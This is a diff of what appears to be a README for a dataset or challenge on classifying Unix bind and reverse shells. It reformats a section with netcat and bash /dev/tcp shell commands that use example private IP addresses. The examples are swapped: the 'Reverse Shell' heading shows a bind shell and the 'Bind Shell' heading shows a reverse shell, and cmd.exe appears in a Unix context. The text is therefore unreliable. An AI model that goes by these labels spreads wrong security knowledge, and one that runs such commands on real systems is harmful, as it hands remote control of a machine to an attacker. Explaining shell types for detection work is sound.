@@ -12,14 +12,17 @@ Participants will be provided with a dataset of Unix shells labeled as bind/reve
 **Description**
 The use of bind or reverse shell is highly scenario-dependent:
 
-**Reverse Shell**: when a target machine is behind a firewall or NAT, making it hard to initiate an inbound connection. The target machine will connect to the attacker's machine in this setup, hence bypassing the firewall restrictions.
-This command is run on the target, 192.168.1.100
-nc -lvp 4444 -e cmd.exe
-This command is run on the attacker, 192.168.1.50
-nc 192.168.1.100 4444
+# **Reverse Shell**:
+When a target machine is behind a firewall or NAT, making it hard to initiate an inbound connection. The target machine will connect to the attacker's machine in this setup, hence bypassing the firewall restrictions.
 
-**Bind Shell**: applicable when the attacker's machine is able to connect directly to the target machine. In that respect, the target machine is listening to some port for incoming connections, and control is given to the attacking machine upon connection to that port.
-This command is run on the attacker, 10.0.0.5
-nc -lvnp 443
 This command is run on the target, 192.168.1.100
-bash -i >& /dev/tcp/10.0.0.5/443 0>&1
+> nc -lvp 4444 -e cmd.exe
+This command is run on the attacker, 192.168.1.50
+> nc 192.168.1.100 4444
+
+# **Bind Shell**:
+Applicable when the attacker's machine is able to connect directly to the target machine. In that respect, the target machine is listening to some port for incoming connections, and control is given to the attacking machine upon connection to that port.
+This command is run on the attacker, 10.0.0.5
+> nc -lvnp 443
+This command is run on the target, 192.168.1.100
+> bash -i >& /dev/tcp/10.0.0.5/443 0>&1
